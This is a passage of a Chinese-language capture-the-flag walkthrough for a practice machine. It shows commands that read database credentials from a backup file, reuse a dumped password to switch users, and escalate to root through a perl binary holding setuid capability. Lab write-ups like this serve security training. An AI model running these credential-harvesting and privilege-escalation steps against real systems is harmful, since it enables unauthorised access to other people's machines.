+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+```
+`stty -a``stty raw -echo;fg``reset`
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+```
+stty rows 17 columns 148
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+切换完成，现在来找找可利用的东西,/var/backups目录下有些备份文件
+
+```
+`cd /var/backups``ls -al`
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+mysql.bak有读的权限，打开看看
+
+```
+cat mysql.bak
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+拿到数据库帐号密码，连进去看看
+
+```
+mysql -ualfauser -ppassw0rd
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+登录成功，看看有多少个库
+
+```
+show databases;
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+进入proximacentauri查表名
+
+```
+`use proximacentauri;``show tables;`
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+只有一张表，看看内容
+
+```
+select * from authors;
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+拿到一个帐号和密码，这个帐号与passwd文件中的登录名一样，可以尝试用户密码是否相同
+
+```
+`+------+---------+-----------------+---------------------+``| id   | name    | password        | email               |``+------+---------+-----------------+---------------------+``|    1 | proxima | alfacentauri123 | vishal@hacksudo.com |``+------+---------+-----------------+---------------------+`
+```
+
+切换到proxima帐号
+
+```
+`su proxima``输入密码alfacentauri123`
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+密码对了，成功切换到proxima帐号，先看看用户目录下有什么
+
+```
+`cd ~``ls -al``cat user.txt`
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+拿到user.txt，还有几个目录进去看看
+
+proximaCentauriB目录有个note.txt看一下内容
+
+```
+`cd proximaCentauriB``cat note.txt`
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+没什么有用的信息，sudo -l沒有这个命令suid也没有可利用的
+
+Capabilities提权
+--------------
+
+简单介绍：
+
+Capabilities 机制是在 Linux 内核 2.2 之后引入的，原理很简单，就是将之前与超级用户 root（UID=0）关联的特权细分为不同的功能组，Capabilites 作为线程（Linux 并不真正区分进程和线程）的属性存在，每个功能组都可以独立启用和禁用。其本质上就是将内核调用分门别类，具有相似功能的内核调用被分到同一组中。
+
+这样一来，权限检查的过程就变成了：在执行特权操作时，如果线程的有效身份不是 root，就去检查其是否具有该特权操作所对应的 capabilities，并以此为依据，决定是否可以执行特权操作。
+
+### 提权
+
+查找有执行权限的程序
+
+```
+getcap -r / 2>/dev/null
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+发现/home/proxima/proximaCentauriA/perl文件有权限，提权试试
+
+```
+./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+提权成功，查看下root目录
+
+```
+`cd /root``ls``cat note.txt``cat root.txt`
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+拿到root.txt，游戏结束
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+END
+
+  
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+**这篇文章到这里就结束了,喜欢打靶的小伙伴可以关注"伏波路上学安全"微信公众号,或扫描下面二维码关注,我会持续更新打靶文章,让我们一起在打靶中学习进步吧.**
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
